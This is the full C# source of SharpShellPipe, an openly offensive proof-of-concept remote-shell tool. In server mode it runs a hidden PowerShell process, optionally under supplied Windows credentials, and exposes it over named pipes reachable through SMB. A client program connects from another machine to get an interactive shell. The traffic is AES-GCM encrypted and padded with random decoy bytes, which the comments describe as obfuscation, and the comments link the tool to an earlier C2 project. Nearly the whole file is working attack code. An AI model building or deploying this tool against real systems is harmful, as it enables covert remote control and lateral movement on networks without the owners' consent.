﻿/*
 * =========================================================================================
 * Project:       SharpShellPipe
 * 
 * Description:   SharpShellPipe is a minimal C# example that showcases the use of Windows
 *                named pipes for gaining remote shell access to either a local or a distant
 *                Windows machine.
 * 
 * Author:        Jean-Pierre LESUEUR (@DarkCoderSc)
 * Email:         jplesueur@phrozen.io
 * Website:       https://www.phrozen.io
 * GitHub:        https://github.com/PhrozenIO
 *                https://github.com/DarkCoderSc
 *                
 * Twitter:       https://twitter.com/DarkCoderSc
 * License:       Apache-2.0
 * 
 * This script is provided "as is", without warranty of any kind, express or implied,     
 * including but not limited to the warranties of merchantability, fitness for a particular     
 * purpose and noninfringement. In no event shall the authors or copyright holders be liable
 * for any claim, damages or other liability, whether in an action of contract, tort or 
 * otherwise, arising from, out of or in connection with the software or the use or other 
 * dealings in the software.                                 
 * 
 * =========================================================================================
 */

using CommandLine;
using System.Collections;
using System.Diagnostics;
using System.IO.Pipes;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;

class Program
{
    public static byte[]? EncryptionKey;

    // Program Configuration Begin ++++++++++++++++++++++++++++++++++++++++++++++++++++
    public const string NamedPipePrefix = "DCSC";
    // Program Configuration End ++++++++++++++++++++++++++++++++++++++++++++++++++++++

    public const string StdOutPipeName = $"{NamedPipePrefix}_stdOutPipe";
    public const string StdInPipeName = $"{NamedPipePrefix}_stdInPipe";

    /// <summary>
    /// Writes a verbose message to the screen, displayed in yellow text along with a small icon to
    /// signify the nature of the output message.
    /// </summary>
    /// <param name="message"></param>
    /// <param name="icon"></param>
    public static void WriteVerbose(string message, char icon)
    {
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine($"[{icon}] {message}");
        Console.ResetColor();
    }

    /// <summary>
    /// The Encrypted Bundle includes both the ciphertext and the associated information required for
    /// decryption. The Nonce and Tag are specifically used in conjunction with AES GCM mode.
    /// The Nonce is used during the decryption process, while the Tag serves as part of the
    /// authentication mechanism in GCM mode. The Salt is used in the AES passphrase derivation process,
    /// adding complexity and ensuring that the AES key is unique across different encryption 
    /// iterations.
    /// </summary>
    protected class EncryptedBundle
    {
        public byte[] Data { get; set; }
        public byte[] Nonce { get; set; }
        public byte[] Tag { get; set; }
        public byte[] Salt { get; set; }
    }

    /// <summary>
    /// The Encrypted Packet Class holds the plaintext data; in our Proof of Concept (PoC), this
    /// is represented by a single character stored as an integer in the Data field. Dummy1 and Dummy2
    /// are decoys introduced to increase the entropy of the Encrypted Packet Class content. Because of
    /// these variables, the size and content of an Encrypted Packet will differ with each iteration,
    /// thereby adding an additional layer of obfuscation to its potential nature once encrypted.
    /// </summary>
    protected class EncryptedPacket
    {
        public byte[] Dummy1 { get; set; }
        public byte[] Data { get; set; }
        public byte[] Dummy2 { get; set; }
    }

    /// <summary>
    /// This method derives a 256-bit key suitable for our AES encryption from the given passphrase.
    /// If no salt is provided, the function generates and returns a random 256-bit salt. Note
    /// that the iteration count is set to 1000; although this may seem low, it is more than
    /// sufficient for our Proof of Concept (PoC). Increasing this value will significantly 
    /// slow down the encryption process for each data chunk/packet. This is particularly important
    /// to consider because in our setup, shell output is sent character by character, and each 
    /// character undergoes passphrase derivation with a new random salt.
    /// </summary>
    /// <param name="passphrase"></param>
    /// <param name="salt"></param>
    /// <returns></returns>
    public static (byte[], byte[]) SetupEncryptionKey(string passphrase, byte[]? salt = null)
    {
        if (salt == null)
        {
            salt = new byte[32]; // 256-bit salt

            // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.randomnumbergenerator?view=net-7.0?WT_mc_id=SEC-MVP-5005282
            using RandomNumberGenerator randomGenerator = RandomNumberGenerator.Create();

            randomGenerator.GetBytes(salt);
        }

        using Rfc2898DeriveBytes pbkdf2 = new(passphrase, salt, 1000);

        return (pbkdf2.GetBytes(32), salt); // 256-bit key
    }

    /// <summary>
    /// This method generates a byte array with both a random size and random content. 
    /// This is used to populate the decoy fields (Dummy1 and Dummy2) in our Encrypted Packet Class.
    /// You can adjust the minimum and maximum size limits to control the range of variability for
    /// the generated array.
    /// </summary>
    /// <returns></returns>
    public static byte[] RandomBytes(uint sizeMinTolerence = 32, uint sizeMaxTolerence = 1024)
    {
        // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.randomnumbergenerator?view=net-7.0?WT_mc_id=SEC-MVP-5005282
        using RandomNumberGenerator randomGenerator = RandomNumberGenerator.Create();

        byte[] randomArraySizeCandidate = new byte[4]; // sizeof(uint)

        uint randomArraySize = 0;

        randomGenerator.GetBytes(randomArraySizeCandidate);

        randomArraySize = sizeMinTolerence +
            (BitConverter.ToUInt32(randomArraySizeCandidate, 0) % (sizeMaxTolerence - sizeMinTolerence + 1));

        byte[] randomBytes = new byte[randomArraySize];

        randomGenerator.GetBytes(randomBytes);

        return randomBytes;
    }

    /// <summary>
    /// Unlike our previous Proof of Concept (PoC) using FtpC2, in this iteration, we will demonstrate
    /// an alternative encryption technique. Instead of employing both RSA and AES,
    /// we will use just a shared passphrase for encryption.
    /// </summary>
    /// <param name="plainData"></param>
    /// <param name="encryptionKey"></param>
    /// <returns></returns>
    public static string Encrypt(byte[] plainData, string encryptionPassphrase)
    {
        (byte[] encryptionKey, byte[] salt) = SetupEncryptionKey(encryptionPassphrase);

        // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.randomnumbergenerator?view=net-7.0?WT_mc_id=SEC-MVP-5005282
        using RandomNumberGenerator randomGenerator = RandomNumberGenerator.Create();

        // Generate a one-time secure random nonce(usually 12 byte / 96 bits)
        // Generating a random nonce is discouraged due to the risk of nonce + same key collision (which is generally very unlikely)
        // For this PoC, we will ignore this best practice since the risk is very low.
        byte[] nonce = new byte[AesGcm.NonceByteSizes.MaxSize];
        randomGenerator.GetBytes(nonce);

        byte[] tag = new byte[AesGcm.TagByteSizes.MaxSize];

        byte[] dummy1 = RandomBytes();
        byte[] dummy2 = RandomBytes();

        EncryptedPacket encryptedPacket = new()
        {
            Dummy1 = dummy1,
            Data = plainData,
            Dummy2 = dummy2,
        };

        string data = JsonSerializer.Serialize(encryptedPacket);

        // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesgcm?view=net-7.0?WT_mc_id=SEC-MVP-5005282
        using AesGcm aes = new(encryptionKey);

        byte[] plainText = Encoding.UTF8.GetBytes(data);
        byte[] cipherText = new byte[plainText.Length];

        // Encrypt plain-text using our setup, an authentication tag will get returned.
        // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesgcm.encrypt?view=net-7.0
        aes.Encrypt(nonce, plainText, cipherText, tag);

        EncryptedBundle encryptedBundle = new()
        {
            Data = cipherText,
            Nonce = nonce,
            Tag = tag,
            Salt = salt,
        };

        return JsonSerializer.Serialize(encryptedBundle);
    }

    /// <summary>
    /// Encrypt String Wrapper
    /// </summary>
    /// <param name="value"></param>
    /// <param name="encryptionPassphrase"></param>
    /// <returns></returns>
    public static String EncryptString(string value, string encryptionPassphrase)
    {
        return Encrypt(Encoding.UTF8.GetBytes(value), encryptionPassphrase);
    }

    /// <summary>
    /// This method reverses the encryption process. It requires the Encrypted Bundle to be supplied as a JSON string.
    /// If the decryption process and all its associated steps are successful, the method will return the
    /// decrypted plaintext, represented as a single character.
    /// </summary>
    /// <param name="encryptedData"></param>
    /// <param name="encryptionKey"></param>
    /// <returns></returns>
    public static byte[]? Decrypt(string encryptedData, string encryptionPassphrase)
    {
        EncryptedBundle? encryptedBundle = JsonSerializer.Deserialize<EncryptedBundle>(encryptedData);
        if (encryptedBundle == null)
            return null;

        (byte[] encryptionKey, _) = SetupEncryptionKey(encryptionPassphrase, encryptedBundle.Salt);

        byte[] plainText = new byte[encryptedBundle.Data.Length];

        // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesgcm?view=net-7.0?WT_mc_id=SEC-MVP-5005282
        using AesGcm aes = new(encryptionKey);

        // https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.aesgcm.decrypt?view=net-7.0?WT_mc_id=SEC-MVP-5005282
        aes.Decrypt(encryptedBundle.Nonce, encryptedBundle.Data, encryptedBundle.Tag, plainText);

        EncryptedPacket? encryptedPacket = JsonSerializer.Deserialize<EncryptedPacket>(plainText);
        if (encryptedPacket == null)
            return null;

        return encryptedPacket.Data;
    }

    /// <summary>
    /// Decrypt a single character from an encrypted data bundle.
    /// </summary>
    /// <param name="encryptedData"></param>
    /// <param name="encryptionPassphrase"></param>
    /// <returns></returns>
    public static char DecryptChar(string encryptedData, string encryptionPassphrase)
    {
        byte[]? plainText = Decrypt(encryptedData, encryptionPassphrase);
        if (plainText == null)
            return '\0';

        return Encoding.UTF8.GetString(plainText)[0];
    }

    /// <summary>
    /// Decrypt String Wrapper
    /// </summary>
    /// <param name="encryptedData"></param>
    /// <param name="encryptionPassphrase"></param>
    /// <returns></returns>
    public static string DecryptString(string encryptedData, string encryptionPassphrase)
    {
        byte[]? plainText = Decrypt(encryptedData, encryptionPassphrase);
        if (plainText == null)
            return String.Empty;

        return Encoding.UTF8.GetString(plainText);
    }

    /// <summary>
    /// This method sets up the shell server using two named pipes: one for receiving shell commands from the client,
    /// and another for sending shell 'stdout' content character by character. While other techniques exist that may
    /// be more or less optimized than sending stream output character by character, this Proof of Concept (PoC) has
    /// the advantage of being highly stable and easy to understand. You're welcome to optimize the mechanism according
    /// to your own preferences.    
    /// </summary>
    public static void ShellPipeServer(string? encryptionPassphrase = null, string? userName = null, System.Security.SecureString? password = null, string? domain = null)
    {
        while (true)
        {
            // https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo?view=net-7.0?WT_mc_id=SEC-MVP-5005282
            ProcessStartInfo processStartInfo = new()
            {
                FileName = "powershell.exe",
                RedirectStandardInput = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            if (!string.IsNullOrEmpty(userName))
            {
                processStartInfo.WorkingDirectory = Environment.GetEnvironmentVariable("SystemRoot");
                processStartInfo.UserName = userName;
                processStartInfo.Password = password;
                processStartInfo.Domain = domain;
            }

            using Process shell = new() { StartInfo = processStartInfo };

            try
            {
                shell.Start();
            }
            catch (Exception e)
            {
                WriteVerbose(string.Format("Exception: \"{0}\"", e.Message), 'x');

                break;
            }

            // https://learn.microsoft.com/en-us/dotnet/api/system.io.pipes.namedpipeserverstream?view=net-7.0?WT_mc_id=SEC-MVP-5005282
            using NamedPipeServerStream stdOutPipe = new(StdOutPipeName, PipeDirection.Out);
            using NamedPipeServerStream stdInPipe = new(StdInPipeName, PipeDirection.In);

            WriteVerbose("Waiting for peer...", '*');

            stdOutPipe.WaitForConnection();
            stdInPipe.WaitForConnection();
            ///                                  

            WriteVerbose("Peer connected!", '+');                                

            Thread stdOutThread = new(() =>
            {
                try
                {
                    using StreamWriter writer = new(stdOutPipe) { AutoFlush = true };

                    int b;
                    while ((b = shell.StandardOutput.Read()) != -1)
                    {
                        if (!String.IsNullOrEmpty(encryptionPassphrase))                            
                            writer.WriteLine(Encrypt(BitConverter.GetBytes(b), encryptionPassphrase));                            
                        else
                            writer.Write((char)b);
                    }
                }
                catch { }
            });
            stdOutThread.Start();

            Thread stdInThread = new(() =>
            {
                try
                {
                    using StreamReader reader = new(stdInPipe);
                    ///

                    if (!String.IsNullOrEmpty(encryptionPassphrase))
                    {
                        string? encryptedData;                            

                        while ((encryptedData = reader.ReadLine()) != null)                                                         
                            shell.StandardInput.Write(DecryptString(encryptedData, encryptionPassphrase));                            
                    }
                    else
                    {
                        string? userInput;
                        while ((userInput = reader.ReadLine()) != null)                                                                      
                            shell.StandardInput.WriteLine(userInput);
                    }
                }
                catch { }
            });
            stdInThread.Start();

            while (true)
            {
                if (!stdOutPipe.IsConnected || !stdInPipe.IsConnected || shell.HasExited)
                    break;

                ///
                Thread.Sleep(100);
            }

            if (!shell.HasExited)
                shell.Kill();

            ///          
            stdOutThread.Join();
            stdInThread.Join();

            ///
            WriteVerbose("Peer disconnected!", '!');
        }        
    }

    /// <summary>
    /// This method establishes a connection to the server using two expected client named pipes: 
    /// one for receiving shell output and another for transmitting shell commands. Communication 
    /// between the client and server is facilitated over Named Pipes using the 
    /// Server Message Block (SMB) protocol.
    /// </summary>
    public static void ShellPipeClient(string? serverComputerName = null, string? encryptionPassphrase = null)
    {
        if (String.IsNullOrEmpty(serverComputerName))
            serverComputerName = ".";
        ///

        using NamedPipeClientStream pipeStdout = new(serverComputerName, StdOutPipeName, PipeDirection.In);
        using NamedPipeClientStream pipeStdin = new(serverComputerName, StdInPipeName, PipeDirection.Out);
       
        WriteVerbose(string.Format(
            "Establishing {0} connection to remote system...", 
            String.IsNullOrEmpty(encryptionPassphrase) ? "an unsecure" : "a secure"
            ), '*');

        pipeStdout.Connect();
        pipeStdin.Connect();

        WriteVerbose("Successfully connected, spawning shell...", '+');               

        int b;
        Thread stdOutThread = new(() =>
        {
            try
            {
                using StreamReader reader = new(pipeStdout);
                ///                

                if (!String.IsNullOrEmpty(encryptionPassphrase))
                {
                    string? encryptedData;
                    char plainChar;

                    while ((encryptedData = reader.ReadLine()) != null)
                    {
                        plainChar = DecryptChar(encryptedData, encryptionPassphrase);
                        if (plainChar != '\0')
                            Console.Write(plainChar);                        
                    }
                }
                else
                {
                    while ((b = reader.Read()) != -1)
                        Console.Write((char)b);
                }
            }
            catch { }
        });
        stdOutThread.Start();

        using StreamWriter writer = new(pipeStdin) { AutoFlush = true };

        while (true)
        {
            if (!pipeStdout.IsConnected)
                break;

            string? cmd = Console.ReadLine();         
            cmd = String.IsNullOrEmpty(cmd) ? "" : cmd.Trim();

            if (!pipeStdin.IsConnected || !pipeStdout.IsConnected)
                break;

            if (!String.IsNullOrEmpty(encryptionPassphrase))                         
                writer.WriteLine(Encrypt(Encoding.UTF8.GetBytes(cmd + '\n'), encryptionPassphrase));            
            else            
                writer.WriteLine(cmd);                            

            ///
            if (cmd.Equals("exit", StringComparison.OrdinalIgnoreCase))
                Thread.Sleep(500);
        }

        pipeStdout.Close();

        stdOutThread.Join();

        ///
        WriteVerbose("Session with remote host is now terminated.", '!');
    }

    /// <summary>
    /// Command-line options
    /// </summary>
    public class Options
    {
        [Option('p', "passphrase", Required = false, HelpText = "A passphrase is used to generate the encryption key that secures communications between the client and the server.")]
        public string? PassPhrase { get; set; }

        [Option('c', "client", Required = false, HelpText = "Use SharpShellPipe as the client to receive a remote interactive shell.")]        
        public bool Client { get; set; }

        [Option('n', "name", Required = false, HelpText = "The Windows machine name where ShellPipeServer is running is required to connect to a remote named pipe. By default, it attempts to connect to the local machine (client mode only).")]
        public string? ServerName { get; set; }

        [Option("username", Required = false, HelpText = "An existing Microsoft Windows user account (server mode only).")]
        public string? Username { get; set; }

        [Option("password", Required = false, HelpText = "Password of specified user account (server mode only).")]
        public string? Password { get; set; }

        [Option("domain", Required = false, HelpText = "Specify the domain of the user account under which the new process is to be started (server mode only).")]
        public string? Domain { get; set; }
    }

    /// <summary>
    /// Program Entrypoint
    /// </summary>
    /// <param name="args"></param>
    public static void Main(string[] args)
    {
        Parser.Default.ParseArguments<Options>(args)
            .WithParsed<Options>(o =>
            {
                if (o.Client)                                    
                    ShellPipeClient(o.ServerName, o.PassPhrase);                
                else
                {
                    System.Security.SecureString? securePassword = null;

                    if (!string.IsNullOrEmpty(o.Password))
                        securePassword = new NetworkCredential("", o.Password).SecurePassword;

                    ShellPipeServer(
                        encryptionPassphrase: o.PassPhrase, userName: o.Username,
                        password: securePassword,
                        domain: o.Domain
                    );
                }
            });    
    }
}